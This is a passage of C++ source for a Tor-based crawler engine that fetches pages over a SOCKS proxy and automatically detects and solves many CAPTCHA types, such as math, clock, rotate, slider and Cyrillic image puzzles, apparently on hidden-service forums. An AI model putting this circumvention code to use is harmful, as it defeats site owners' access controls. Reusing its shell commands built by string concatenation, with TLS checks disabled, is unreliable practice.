            std::lock_guard<std::mutex> lock(torInfoMtx_);
            torInfoCache_ = info;
            torInfoCacheMs_ = nowMillis();
        }
        return info;
    }

    std::string resp = controlTransact(fd,
        "GETINFO status/bootstrap-phase circuit-status version traffic/read traffic/written");
    CLOSESOCK(fd);

    info.connected = true;

    auto pos = resp.find("PROGRESS=");
    if (pos != std::string::npos) {
        size_t end = resp.find_first_of(" \r\n", pos + 9);
        info.bootstrap = resp.substr(pos + 9, end - pos - 9) + "%";
        torBootstrap_ = info.bootstrap;
    }

    int circuits = 0;
    size_t searchPos = 0;
    while ((searchPos = resp.find("BUILT", searchPos)) != std::string::npos) {
        circuits++;
        searchPos += 5;
    }
    info.circuits = circuits;
    torCircuits_ = circuits;

    pos = resp.find("version=");
    if (pos != std::string::npos) {
        size_t end = resp.find_first_of(" \r\n", pos + 8);
        info.version = resp.substr(pos + 8, end - pos - 8);
    }

    info.trafficRead = parseGetinfoInt(resp, "traffic/read");
    info.trafficWritten = parseGetinfoInt(resp, "traffic/written");
    int64_t nowT = nowMillis();
    if (lastTrafficTs_ > 0 && nowT > lastTrafficTs_ &&
        info.trafficRead >= lastTrafficRead_ && info.trafficWritten >= lastTrafficWritten_) {
        double dt = (nowT - lastTrafficTs_) / 1000.0;
        if (dt >= 0.2) {
            inboundKbps_ = (int)((info.trafficRead - lastTrafficRead_) / 1024.0 / dt);
            outboundKbps_ = (int)((info.trafficWritten - lastTrafficWritten_) / 1024.0 / dt);
            if (inboundKbps_ < 0) inboundKbps_ = 0;
            if (outboundKbps_ < 0) outboundKbps_ = 0;
        }
    }
    lastTrafficRead_ = info.trafficRead;
    lastTrafficWritten_ = info.trafficWritten;
    lastTrafficTs_ = nowT;

    {
        std::lock_guard<std::mutex> lock(torInfoMtx_);
        torInfoCache_ = info;
        torInfoCacheMs_ = nowMillis();
    }
    return info;
}

bool SynapsedEngine::isUrlSafe(const std::string& url) const {
    for (char c : url) {
        if (!((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
              (c >= '0' && c <= '9') || c == ':' || c == '/' ||
              c == '.' || c == '_' || c == '?' || c == '&' ||
              c == '=' || c == '%' || c == '+' || c == '#' || c == '-'))
            return false;
    }
    return !url.empty();
}

std::string SynapsedEngine::fetchViaTor(const std::string& url) const {
    if (!isUrlSafe(url)) return "";
    torRateLimit(extractDomain(url));
    std::string ua = randomUserAgent();
    int timeout = 45;
    if (url.find("dread") != std::string::npos) timeout = 90;
    std::string cmd = "curl -s -k --max-time " + std::to_string(timeout) +
        " --socks5-hostname 127.0.0.1:" + std::to_string(gSocksPort.load()) + " -L "
        "-H \"User-Agent: " + ua + "\" "
        "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt "
        "\"" + url + "\" 2>/dev/null";
    return execCmd(cmd);
}

SynapsedEngine::CaptchaResult SynapsedEngine::detectCaptcha(const std::string& html) const {
    CaptchaResult r;

    if (html.find("captcha") == std::string::npos &&
        html.find("CAPTCHA") == std::string::npos &&
        html.find("Captcha") == std::string::npos) {
        return r;
    }
    r.detected = true;

    size_t mathPos = std::string::npos;
    for (const auto& pat : {"What is ", "Solve: ", "Calculate: ", "Enter the result of "}) {
        mathPos = html.find(pat);
        if (mathPos != std::string::npos) break;
    }
    if (mathPos == std::string::npos) {
        size_t inp = html.find("name=\"captcha");
        if (inp != std::string::npos) {
            size_t scan = inp;
            while (scan > 0 && scan > inp - 200) {
                scan--;
                if (html[scan] >= '0' && html[scan] <= '9') {
                    size_t exprStart = scan;
                    while (exprStart > 0 && (
                        (html[exprStart - 1] >= '0' && html[exprStart - 1] <= '9') ||
                        html[exprStart - 1] == '+' || html[exprStart - 1] == '-' ||
                        html[exprStart - 1] == '*' || html[exprStart - 1] == '/' ||
                        html[exprStart - 1] == ' ' || html[exprStart - 1] == 'x'))
                        exprStart--;
                    std::string candidate = trim(html.substr(exprStart, scan - exprStart + 1));
                    bool hasOp = false;
                    for (char c : candidate) {
                        if (c == '+' || c == '-' || c == '*' || c == '/' || c == 'x') hasOp = true;
                    }
                    if (hasOp && candidate.size() >= 3) {
                        r.type = "math";
                        r.answer = solveMathCaptcha(candidate);
                        r.solved = !r.answer.empty();
                        return r;
                    }
                    break;
                }
            }
        }
    }

    if (mathPos != std::string::npos) {
        size_t eqEnd = html.find_first_of("?=<\n\r", mathPos + 5);
        if (eqEnd == std::string::npos) eqEnd = mathPos + 30;
        std::string expr = trim(html.substr(mathPos, eqEnd - mathPos));
        for (const auto& pfx : {"What is ", "Solve: ", "Calculate: ", "Enter the result of "}) {
            if (expr.find(pfx) == 0) expr = expr.substr(strlen(pfx));
        }
        expr = trim(expr);
        if (expr.back() == '?' || expr.back() == '=') expr.pop_back();
        expr = trim(expr);
        r.type = "math";
        r.answer = solveMathCaptcha(expr);
        r.solved = !r.answer.empty();
        return r;
    }

    if (html.find("odd one out") != std::string::npos ||
        html.find("pick the odd") != std::string::npos ||
        html.find("which is different") != std::string::npos ||
        html.find("which one does not") != std::string::npos ||
        html.find("select the different") != std::string::npos) {
        r.type = "odd_one_out";
        r.answer = solveOddOneOut(html, "");
        r.solved = !r.answer.empty();
        return r;
    }

    if (html.find("what time") != std::string::npos ||
        html.find("What time") != std::string::npos ||
        html.find("clock") != std::string::npos ||
        html.find("tell the time") != std::string::npos) {
        size_t cPos = html.find("clock");
        if (cPos == std::string::npos) cPos = html.find("time");
        size_t imgTag = html.find("<img", cPos > 200 ? cPos - 200 : 0);
        if (imgTag != std::string::npos) {
            size_t srcPos = html.find("src=\"", imgTag);
            if (srcPos != std::string::npos) {
                srcPos += 5;
                size_t srcEnd = html.find('"', srcPos);
                if (srcEnd != std::string::npos) {
                    r.type = "clock";
                    r.answer = solveClockCaptcha(html.substr(srcPos, srcEnd - srcPos));
                    r.solved = !r.answer.empty();
                    return r;
                }
            }
        }
    }

    if (html.find("missing") != std::string::npos &&
        (html.find("hieroglyph") != std::string::npos ||
         html.find("symbol") != std::string::npos ||
         html.find("character") != std::string::npos)) {
        r.type = "hieroglyph";
        r.answer = solveHieroglyphCaptcha(html);
        r.solved = !r.answer.empty();
        return r;
    }

    if (html.find("decaptcha") != std::string::npos ||
        html.find("ddos_form") != std::string::npos) {
        if (html.find("rotate") != std::string::npos) {
            r.type = "rotate";
            r.answer = solveRotateCaptcha(html);
            r.solved = !r.answer.empty();
            return r;
        }
        r.type = "rotate";
        r.answer = solveRotateCaptcha(html);
        r.solved = !r.answer.empty();
        return r;
    }

    if (html.find("ancaptcha") != std::string::npos ||
        html.find("anCaptcha") != std::string::npos ||
        html.find("anC_") != std::string::npos) {
        if (html.find("rotate") != std::string::npos ||
            html.find("Rotate") != std::string::npos) {
            r.type = "rotate";
            r.answer = solveRotateCaptcha(html);
            r.solved = !r.answer.empty();
            return r;
        }
        if (html.find("slider") != std::string::npos ||
            html.find("Slider") != std::string::npos ||
            html.find("slide") != std::string::npos) {
            r.type = "slider";
            r.answer = solveSliderCaptcha(html);
            r.solved = !r.answer.empty();
            return r;
        }
        if (html.find("pair") != std::string::npos ||
            html.find("Pair") != std::string::npos ||
            html.find("match") != std::string::npos) {
            r.type = "pair";
            r.answer = solvePairCaptcha(html);
            r.solved = !r.answer.empty();
            return r;
        }
        r.type = "rotate";
        r.answer = solveRotateCaptcha(html);
        r.solved = !r.answer.empty();
        return r;
    }

    if (html.find("rotate") != std::string::npos &&
        html.find("captcha") != std::string::npos &&
        html.find("data-angle") != std::string::npos) {
        r.type = "rotate";
        r.answer = solveRotateCaptcha(html);
        r.solved = !r.answer.empty();
        return r;
    }

    if ((html.find("slider") != std::string::npos || html.find("slide") != std::string::npos) &&
        html.find("captcha") != std::string::npos &&
        (html.find("puzzle") != std::string::npos || html.find("drag") != std::string::npos)) {
        r.type = "slider";
        r.answer = solveSliderCaptcha(html);
        r.solved = !r.answer.empty();
        return r;
    }

    if (html.find("<select") != std::string::npos &&
        html.find("captcha") != std::string::npos) {
        r.type = "multi_step";
        r.answer = solveMultiStepCaptcha(html);
        r.solved = !r.answer.empty();
        return r;
    }

    bool hasCyrillic = false;
    for (size_t i = 0; i + 1 < html.size(); i++) {
        unsigned char c1 = html[i], c2 = html[i + 1];
        if (c1 == 0xD0 && c2 >= 0x90 && c2 <= 0xBF) { hasCyrillic = true; break; }
        if (c1 == 0xD1 && c2 >= 0x80 && c2 <= 0x8F) { hasCyrillic = true; break; }
    }

    if (html.find("qa-captcha") != std::string::npos ||
        html.find("data-xf-init=\"qa-captcha\"") != std::string::npos) {
        size_t qaDiv = html.find("qa-captcha");
        size_t mathStart = html.find_first_of("0123456789", qaDiv);
        if (mathStart != std::string::npos && mathStart < qaDiv + 200) {
            size_t mathEnd = mathStart;
            while (mathEnd < html.size() && (std::isdigit(html[mathEnd]) ||
                   html[mathEnd] == '+' || html[mathEnd] == '-' ||
                   html[mathEnd] == '*' || html[mathEnd] == 'x' ||
                   html[mathEnd] == ' ')) mathEnd++;
            std::string expr = trim(html.substr(mathStart, mathEnd - mathStart));
            if (!expr.empty()) {
                r.type = "math";
                r.answer = solveMathCaptcha(expr);
                r.solved = !r.answer.empty();
                return r;
            }
        }
    }

    size_t imgPos = html.find("captcha");
    if (imgPos == std::string::npos) imgPos = html.find("CAPTCHA");
    if (imgPos != std::string::npos) {
        size_t imgTag = html.rfind("<img", imgPos);
        if (imgTag == std::string::npos || imgPos - imgTag > 500)
            imgTag = html.find("<img", imgPos);
        if (imgTag != std::string::npos) {
            size_t srcPos = html.find("src=\"", imgTag);
            if (srcPos != std::string::npos && srcPos < imgTag + 500) {
                srcPos += 5;
                size_t srcEnd = html.find('"', srcPos);
                if (srcEnd != std::string::npos) {
                    std::string imgUrl = html.substr(srcPos, srcEnd - srcPos);
                    if (hasCyrillic) {
                        r.type = "cyrillic_text";
                        r.answer = solveTextCaptchaCyrillic(imgUrl);
                    } else {
                        r.type = "text_image";
                        r.answer = solveTextCaptcha(imgUrl);
                    }
                    r.solved = !r.answer.empty();
                    return r;
                }
            }
        }
    }

    r.type = "unknown";
    return r;
}

std::string SynapsedEngine::solveMathCaptcha(const std::string& expr) const {
    std::string clean;
    for (char c : expr) {
        if (c == 'x' || c == 'X') clean += '*';
        else if ((c >= '0' && c <= '9') || c == '+' || c == '-' || c == '*' || c == '/' || c == ' ')
            clean += c;
    }
    clean = trim(clean);
    if (clean.empty()) return "";

    int result = 0;
    int current = 0;
    char lastOp = '+';
    bool hasNum = false;

    for (size_t i = 0; i <= clean.size(); i++) {
        char c = (i < clean.size()) ? clean[i] : '+';
        if (c >= '0' && c <= '9') {
            current = current * 10 + (c - '0');
            hasNum = true;
        } else if (c == '+' || c == '-' || c == '*' || c == '/') {
            if (!hasNum) continue;
            if (lastOp == '+') result += current;
            else if (lastOp == '-') result -= current;
            else if (lastOp == '*') result *= current;
            else if (lastOp == '/' && current != 0) result /= current;
            current = 0;
            hasNum = false;
            lastOp = c;
        }
    }

    return std::to_string(result);
}

std::string SynapsedEngine::solveTextCaptcha(const std::string& imgUrl) const {
    if (imgUrl.empty()) return "";

    std::string ts = std::to_string(nowMillis());
    std::string tmpImg = "" + dataDir_ + "/captcha_" + ts + ".png";
    std::string cleanImg = "" + dataDir_ + "/captcha_" + ts + "_clean.png";

    if (imgUrl.find("data:image") == 0) {
        size_t commaP = imgUrl.find(',');
        if (commaP == std::string::npos) return "";
        std::string b64 = imgUrl.substr(commaP + 1);
        for (char c : b64) {
            if (!((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
                  (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '=' || c == '\n' || c == '\r'))
                return "";
        }
        {
            std::ofstream b64f(tmpImg + ".b64", std::ios::binary);
            if (!b64f) return "";
            b64f.write(b64.c_str(), b64.size());
        }
        std::string decodeCmd = "base64 -d < " + tmpImg + ".b64 > " + tmpImg + " 2>/dev/null";
        SYSTEM_IGNORE(decodeCmd.c_str());
        std::remove((tmpImg + ".b64").c_str());
    } else {
        if (imgUrl[0] == '/') return "";
        if (!isUrlSafe(imgUrl)) return "";
        std::string dlCmd = "curl -s --max-time 15 " + socks5Arg() + " -L "
            "-c " + dataDir_ + "/tor_cookies.txt -b " + dataDir_ + "/tor_cookies.txt "
            "-o " + tmpImg + " \"" + imgUrl + "\" 2>/dev/null";
        SYSTEM_IGNORE(dlCmd.c_str());
    }

    std::string cnnModel = dataDir_ + "/captcha_cnn_model.pt";
    {
        std::ifstream cnnCheck(cnnModel);
        if (cnnCheck.good()) {
            std::string cnnCmd = "python3 " + dataDir_ +
                "/../tools/captcha_cnn/infer.py --model " + cnnModel +
                " " + tmpImg + " 2>/dev/null";
            std::string cnnResult = trim(execCmd(cnnCmd));
            if (cnnResult.size() >= 3 && cnnResult.size() <= 8) {
                std::string cnnAnswer;
                for (char c : cnnResult)
                    if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9'))
                        cnnAnswer += c;
                if (cnnAnswer.size() >= 3) {
                    std::remove(tmpImg.c_str());
                    return cnnAnswer;
                }
            }
        }
    }

    std::string mlScript =
        "python3 -c \""
        "import sys, os\\n"
        "img_path = '" + tmpImg + "'\\n"
        "clean_path = '" + cleanImg + "'\\n"
        "WL = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'\\n"
        "results = []\\n"
        "try:\\n"
        "  import cv2, numpy as np\\n"
        "  img = cv2.imread(img_path)\\n"
        "  if img is None: print(''); sys.exit()\\n"
        "  gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\\n"
        "  h, w = gray.shape\\n"
        "  is_hard = (w >= 300 and h >= 80)\\n"
        "  # Strategy 1: Otsu threshold + resize\\n"
        "  sc = max(3, 600 // max(w, 1))\\n"
        "  big = cv2.resize(gray, (w*sc, h*sc), interpolation=cv2.INTER_LANCZOS4)\\n"
        "  blur = cv2.GaussianBlur(big, (3,3), 0)\\n"
        "  _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)\\n"
        "  cv2.imwrite(clean_path, th)\\n"
        "  # Strategy 2: color kmeans segmentation (for busy backgrounds)\\n"
        "  kmeans_paths = []\\n"
        "  if is_hard:\\n"
        "    Z = img.reshape((-1,3)).astype(np.float32)\\n"
        "    crit = (cv2.TERM_CRITERIA_EPS + cv2.TERM_CRITERIA_MAX_ITER, 10, 1.0)\\n"
        "    _, labels, centers = cv2.kmeans(Z, 5, None, crit, 5, cv2.KMEANS_RANDOM_CENTERS)\\n"
        "    centers = np.uint8(centers)\\n"
        "    bri = [np.mean(c) for c in centers]\\n"
        "    si = list(np.argsort(bri))\\n"
        "    for combo in [si[:1], si[:2], si[-1:], si[-2:]]:\\n"
        "      mask = np.zeros(labels.shape[0], dtype=np.uint8)\\n"
        "      for i in combo: mask[labels.flatten() == i] = 255\\n"
        "      mask = mask.reshape((h, w))\\n"
        "      inv = cv2.bitwise_not(mask)\\n"
        "      bp = clean_path.replace('.png', '_km' + str(combo[0]) + '.png')\\n"
        "      b2 = cv2.resize(inv, (800, 200), interpolation=cv2.INTER_LANCZOS4)\\n"
        "      cv2.imwrite(bp, b2)\\n"
        "      kmeans_paths.append(bp)\\n"
        "    # Strategy 3: HSV color isolation\\n"
        "    hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)\\n"
        "    green = cv2.inRange(hsv, np.array([35,40,40]), np.array([85,255,255]))\\n"
        "    white = cv2.inRange(hsv, np.array([0,0,180]), np.array([180,30,255]))\\n"
        "    dark = cv2.inRange(hsv, np.array([0,0,0]), np.array([180,255,80]))\\n"
        "    combined = green | white | dark\\n"
        "    b3 = cv2.resize(cv2.bitwise_not(combined), (800,200), interpolation=cv2.INTER_LANCZOS4)\\n"
        "    hsvp = clean_path.replace('.png', '_hsv.png')\\n"
        "    cv2.imwrite(hsvp, b3)\\n"
        "    kmeans_paths.append(hsvp)\\n"
        "    lab = cv2.cvtColor(img, cv2.COLOR_BGR2LAB)\\n"
        "    a_ch = lab[:,:,1]; b_ch = lab[:,:,2]\\n"
        "    _, a_hi = cv2.threshold(a_ch, 140, 255, cv2.THRESH_BINARY)\\n"
        "    _, a_lo = cv2.threshold(a_ch, 110, 255, cv2.THRESH_BINARY_INV)\\n"
        "    _, b_hi = cv2.threshold(b_ch, 140, 255, cv2.THRESH_BINARY)\\n"
        "    _, b_lo = cv2.threshold(b_ch, 100, 255, cv2.THRESH_BINARY_INV)\\n"
        "    lab_mask = a_hi | a_lo | b_hi | b_lo\\n"
        "    lk = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (3,3))\\n"
        "    lab_mask = cv2.morphologyEx(lab_mask, cv2.MORPH_CLOSE, lk)\\n"
        "    lab_big = cv2.resize(lab_mask, (800,200), interpolation=cv2.INTER_LANCZOS4)\\n"
        "    labp = clean_path.replace('.png', '_lab.png')\\n"
        "    cv2.imwrite(labp, lab_big)\\n"
        "    kmeans_paths.append(labp)\\n"
        "    clahe = cv2.createCLAHE(clipLimit=3.0, tileGridSize=(4,4))\\n"
        "    cl = clahe.apply(gray)\\n"
        "    cl_big = cv2.resize(cl, (800,200), interpolation=cv2.INTER_LANCZOS4)\\n"
        "    clp = clean_path.replace('.png', '_clahe.png')\\n"
        "    cv2.imwrite(clp, cl_big)\\n"
        "    kmeans_paths.append(clp)\\n"
        "except: pass\\n"
        "# EasyOCR on original\\n"
        "try:\\n"
        "  import easyocr\\n"
        "  reader = easyocr.Reader(['en'], gpu=False, verbose=False)\\n"
        "  r = reader.readtext(img_path, detail=1, allowlist=WL)\\n"
        "  for _, t, c in r:\\n"
        "    results.append((t, c, 'easy_orig'))\\n"
        "  # EasyOCR on kmeans variants\\n"
        "  for kp in kmeans_paths:\\n"
        "    if os.path.exists(kp):\\n"
        "      r2 = reader.readtext(kp, detail=1, allowlist=WL)\\n"
        "      for _, t2, c2 in r2:\\n"
        "        results.append((t2, c2, 'easy_' + kp))\\n"
        "except: pass\\n"
        "# Tesseract on Otsu\\n"
        "try:\\n"
        "  import subprocess\\n"
        "  for psm in ['7', '8', '6']:\\n"
        "    for target in [clean_path, img_path]:\\n"
        "      if not os.path.exists(target): continue\\n"
        "      r3 = subprocess.run(['tesseract', target, 'stdout', '--psm', psm,\\n"
        "        '-c', 'tessedit_char_whitelist=' + WL], capture_output=True, text=True, timeout=10)\\n"
        "      t = r3.stdout.strip()\\n"
        "      if len(t) >= 2: results.append((t, 0.5, 'tess_' + psm))\\n"
        "      if len(t) >= 3: break\\n"
        "except: pass\\n"
        "# TrOCR transformer (best for scene text)\\n"
        "try:\\n"
        "  from transformers import TrOCRProcessor, VisionEncoderDecoderModel\\n"
        "  from PIL import Image\\n"
        "  proc = TrOCRProcessor.from_pretrained('microsoft/trocr-small-printed')\\n"
        "  mdl = VisionEncoderDecoderModel.from_pretrained('microsoft/trocr-small-printed')\\n"
        "  pil = Image.open(img_path).convert('RGB')\\n"
        "  pv = proc(images=pil, return_tensors='pt').pixel_values\\n"
        "  ids = mdl.generate(pv)\\n"
        "  tt = proc.batch_decode(ids, skip_special_tokens=True)[0]\\n"
        "  if len(tt) >= 2: results.append((tt, 0.9, 'trocr'))\\n"
        "except: pass\\n"
        "# Pick best: high confidence wins, penalize noise\\n"
        "if not results: print('')\\n"
        "else:\\n"
        "  def score(x):\\n"
        "    t,c,_=x; n=len(t)\\n"
        "    if n<2: return 0\\n"
        "    len_pen = 1.0 if 3<=n<=6 else 0.6 if n<=8 else 0.3\\n"
        "    b_count = sum(1 for ch in t if ch in 'B8')\\n"
        "    b_pen = 1.0 if b_count <= 2 else 0.4 if b_count <= 3 else 0.1\\n"
        "    consec = 0; mx = 0\\n"
        "    for ch in t:\\n"
        "      if ch in 'B8': consec += 1; mx = max(mx, consec)\\n"
        "      else: consec = 0\\n"
        "    if mx >= 3: b_pen *= 0.1\\n"
        "    return c * len_pen * b_pen\\n"
        "  best = max(results, key=score)\\n"
        "  ans = ''.join(c for c in best[0] if c.isalnum())\\n"
        "  print(ans)\\n"
        "# Cleanup\\n"
        "import glob\\n"
        "for f in glob.glob(clean_path.replace('.png', '*.png')): os.remove(f)\\n"
        "\" 2>/dev/null";
    std::string mlResult = trim(execCmd(mlScript));

    std::remove(tmpImg.c_str());
    std::remove(cleanImg.c_str());

    std::string answer;
    for (char c : mlResult)
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9'))
            answer += c;
    return answer;
}

std::string SynapsedEngine::submitCaptchaAndRefetch(const std::string& url,
    const std::string& formAction, const std::string& field,
    const std::string& answer) const {
    if (!isUrlSafe(url) || answer.empty()) return "";

    std::string postUrl = formAction.empty() ? url : formAction;
    if (!isUrlSafe(postUrl)) return "";

    std::string postData = field + "=" + answer;
    std::string cmd = "curl -s --max-time 30 " + socks5Arg() + " -L "
                      "-c " + dataDir_ + "/cookies.txt -b " + dataDir_ + "/cookies.txt "
                      "-d \"" + postData + "\" "
                      "\"" + postUrl + "\" 2>/dev/null";
    std::string result = execCmd(cmd);

    if (result.find("captcha") != std::string::npos ||
        result.find("CAPTCHA") != std::string::npos) {
        return "";
    }
    return result;
}

std::string SynapsedEngine::downloadCaptchaImage(const std::string& imgUrl) const {
    if (imgUrl.empty() || !isUrlSafe(imgUrl)) return "";
    std::string tmpImg = "" + dataDir_ + "/cap_" + std::to_string(nowMillis()) + ".png";
    std::string cmd = "curl -s --max-time 15 " + socks5Arg() + " -L -o " +
                      tmpImg + " \"" + imgUrl + "\" 2>/dev/null";
    SYSTEM_IGNORE(cmd.c_str());
    std::ifstream check(tmpImg);
    if (!check.good()) return "";
    return tmpImg;
}

std::string SynapsedEngine::classifyImage(const std::string& imgPath) const {
    std::string preprocessed = imgPath + "_proc.png";
    std::string cmd = "convert " + imgPath +
        " -resize 224x224! -colorspace Gray -normalize " +
        preprocessed + " 2>/dev/null";
    SYSTEM_IGNORE(cmd.c_str());

    std::string result = execCmd(
        "tesseract " + preprocessed + " stdout --psm 13 2>/dev/null");
    std::remove(preprocessed.c_str());
    std::string clean = trim(result);
    if (!clean.empty()) return clean;

    std::string identify = execCmd(
        "identify -verbose " + imgPath + " 2>/dev/null | head -40");

    std::string label;
    size_t colors = 0;
    size_t pos = identify.find("Colors:");
    if (pos != std::string::npos) {
        colors = std::atoi(identify.c_str() + pos + 7);
    }

    bool hasGreen = identify.find("green") != std::string::npos ||
                    identify.find("Green") != std::string::npos;
    bool hasBrown = identify.find("brown") != std::string::npos ||
                    identify.find("saddlebrown") != std::string::npos;
    bool hasBlue = identify.find("blue") != std::string::npos ||
                   identify.find("Blue") != std::string::npos;
    bool hasRed = identify.find("red") != std::string::npos;

    if (hasGreen && !hasBlue && !hasRed) label = "plant";
    else if (hasBrown && !hasGreen) label = "animal";
    else if (hasBlue && !hasGreen && !hasRed) label = "sky";
    else if (hasRed) label = "object";
    else label = "unknown_" + std::to_string(colors);

    return label;
}

std::string SynapsedEngine::solveTextCaptchaCyrillic(const std::string& imgUrl) const {
    std::string tmpImg = downloadCaptchaImage(imgUrl);
    if (tmpImg.empty()) return "";

    std::string preprocessed = tmpImg + "_clean.png";
    SYSTEM_IGNORE(("convert " + tmpImg +
            " -colorspace Gray -blur 0x1 -threshold 50% -morphology Open Square "
            + preprocessed + " 2>/dev/null").c_str());

    std::string ocrResult = execCmd(
        "tesseract " + preprocessed + " stdout -l rus --psm 7 "
        "-c tessedit_char_whitelist="
        "\xD0\x90\xD0\x91\xD0\x92\xD0\x93\xD0\x94\xD0\x95\xD0\x96\xD0\x97"
        "\xD0\x98\xD0\x99\xD0\x9A\xD0\x9B\xD0\x9C\xD0\x9D\xD0\x9E\xD0\x9F"
        "\xD0\xA0\xD0\xA1\xD0\xA2\xD0\xA3\xD0\xA4\xD0\xA5\xD0\xA6\xD0\xA7"
        "\xD0\xA8\xD0\xA9\xD0\xAA\xD0\xAB\xD0\xAC\xD0\xAD\xD0\xAE\xD0\xAF"
        "\xD0\xB0\xD0\xB1\xD0\xB2\xD0\xB3\xD0\xB4\xD0\xB5\xD0\xB6\xD0\xB7"
        "\xD0\xB8\xD0\xB9\xD0\xBA\xD0\xBB\xD0\xBC\xD0\xBD\xD0\xBE\xD0\xBF"
        "\xD1\x80\xD1\x81\xD1\x82\xD1\x83\xD1\x84\xD1\x85\xD1\x86\xD1\x87"
        "\xD1\x88\xD1\x89\xD1\x8A\xD1\x8B\xD1\x8C\xD1\x8D\xD1\x8E\xD1\x8F"
        "0123456789 2>/dev/null");

    std::remove(tmpImg.c_str());
    std::remove(preprocessed.c_str());
    return trim(ocrResult);
}

std::string SynapsedEngine::solveOddOneOut(const std::string& html,
    const std::string& baseUrl) const {

    std::vector<std::string> imgUrls;
    std::vector<std::string> imgIds;
    size_t searchPos = 0;

    while (imgUrls.size() < 12) {
        size_t imgTag = html.find("<img", searchPos);
        if (imgTag == std::string::npos) break;
        size_t tagEnd = html.find('>', imgTag);
        if (tagEnd == std::string::npos) break;
        std::string tag = html.substr(imgTag, tagEnd - imgTag + 1);
        searchPos = tagEnd + 1;

        size_t srcP = tag.find("src=\"");
        if (srcP == std::string::npos) continue;
        srcP += 5;
        size_t srcE = tag.find('"', srcP);
        if (srcE == std::string::npos) continue;
        std::string src = tag.substr(srcP, srcE - srcP);
        if (src.find("captcha") == std::string::npos &&
            src.find("puzzle") == std::string::npos &&
            src.find("challenge") == std::string::npos) continue;

        imgUrls.push_back(src);

        size_t idP = tag.find("data-id=\"");
        if (idP == std::string::npos) idP = tag.find("id=\"");
        if (idP != std::string::npos) {
            size_t q = tag.find('"', idP + 5);
            size_t q2 = tag.find('"', q + 1);
            if (q != std::string::npos && q2 != std::string::npos)
                imgIds.push_back(tag.substr(q + 1, q2 - q - 1));
            else
                imgIds.push_back(std::to_string(imgUrls.size() - 1));
        } else {
            imgIds.push_back(std::to_string(imgUrls.size() - 1));
        }
    }

    if (imgUrls.size() < 3) return "";

    std::vector<std::string> labels;
    for (const auto& url : imgUrls) {
        std::string path = downloadCaptchaImage(url);
        if (path.empty()) { labels.push_back("fail"); continue; }
        std::string label = classifyImage(path);
        labels.push_back(label);
        std::remove(path.c_str());
    }

    std::unordered_map<std::string, int> counts;
    for (const auto& l : labels) counts[l]++;

    std::string oddLabel;
    int minCount = 9999;
    for (const auto& kv : counts) {
        if (kv.second < minCount) { minCount = kv.second; oddLabel = kv.first; }
    }

    if (minCount >= (int)labels.size() / 2) return "";

    for (size_t i = 0; i < labels.size(); i++) {
        if (labels[i] == oddLabel) return imgIds[i];
    }
    return "";
}

std::string SynapsedEngine::solveClockCaptcha(const std::string& imgUrl) const {
    std::string tmpImg = downloadCaptchaImage(imgUrl);
    if (tmpImg.empty()) return "";

    std::string grayImg = tmpImg + "_gray.png";
    SYSTEM_IGNORE(("convert " + tmpImg +
            " -colorspace Gray -blur 0x2 -canny 0x1+10%+30% " +
            grayImg + " 2>/dev/null").c_str());

    std::string lines = execCmd(
        "python3 -c \""
        "import sys;"
        "try:\n"
        "  import cv2, math, numpy as np;"
        "  img=cv2.imread('" + grayImg + "',0);"
        "  h,w=img.shape;"
        "  cx,cy=w//2,h//2;"
        "  edges=cv2.Canny(img,50,150);"
        "  lns=cv2.HoughLinesP(edges,1,math.pi/180,30,minLineLength=int(min(h,w)*0.15),maxLineGap=10);"
        "  if lns is None: print('ERR');sys.exit();"
        "  hands=[];"
        "  for l in lns:\n"
        "    x1,y1,x2,y2=l[0];"
        "    ln=math.sqrt((x2-x1)**2+(y2-y1)**2);"
        "    ang=math.degrees(math.atan2(cy-(y1+y2)/2,((x1+x2)/2)-cx));"
        "    ang=(90-ang)%360;"
        "    hands.append((ln,ang));"
        "  hands.sort(key=lambda x:-x[0]);"
        "  if len(hands)<2: print('ERR');sys.exit();"
        "  mAng=hands[0][1];"
        "  hAng=hands[1][1];"
        "  mins=int((mAng/360)*60)%60;"
        "  hrs=int((hAng/360)*12)%12;"
        "  print(f'{hrs:02d}:{mins:02d}');"
        "except: print('ERR');"
        "\" 2>/dev/null");

    std::remove(tmpImg.c_str());
    std::remove(grayImg.c_str());

    std::string result = trim(lines);
    if (result == "ERR" || result.empty()) return "";
    return result;
}

std::string SynapsedEngine::solveHieroglyphCaptcha(const std::string& html) const {
    std::vector<std::string> shownSymbols;
    size_t pos = 0;
    while (shownSymbols.size() < 20) {
        size_t sp = html.find("data-symbol=\"", pos);
        if (sp == std::string::npos) break;
        sp += 13;
        size_t se = html.find('"', sp);
        if (se == std::string::npos) break;
        shownSymbols.push_back(html.substr(sp, se - sp));
        pos = se + 1;
    }

    if (shownSymbols.empty()) {
        pos = 0;
        std::string gridStart = "class=\"grid";
        size_t gridPos = html.find(gridStart);
        if (gridPos == std::string::npos) gridPos = html.find("class=\"symbols");
        if (gridPos != std::string::npos) {
            size_t end = html.find("</div>", gridPos);
            if (end == std::string::npos) end = html.size();
            std::string grid = html.substr(gridPos, end - gridPos);
            size_t sp2 = 0;
            while (sp2 < grid.size()) {
                size_t gt = grid.find('>', sp2);
                if (gt == std::string::npos) break;
                size_t lt = grid.find('<', gt + 1);
                if (lt == std::string::npos) break;
                std::string sym = trim(grid.substr(gt + 1, lt - gt - 1));
                if (!sym.empty() && sym.size() <= 8) shownSymbols.push_back(sym);
                sp2 = lt;
            }
        }
    }

    if (shownSymbols.size() < 3) return "";

    std::vector<std::string> optionSymbols;
    size_t selPos = html.find("<select");
    if (selPos != std::string::npos) {
        size_t selEnd = html.find("</select>", selPos);
        std::string sel = html.substr(selPos, selEnd - selPos);
        size_t op = 0;
        while (true) {
            size_t vs = sel.find("value=\"", op);
            if (vs == std::string::npos) break;
            vs += 7;
            size_t ve = sel.find('"', vs);
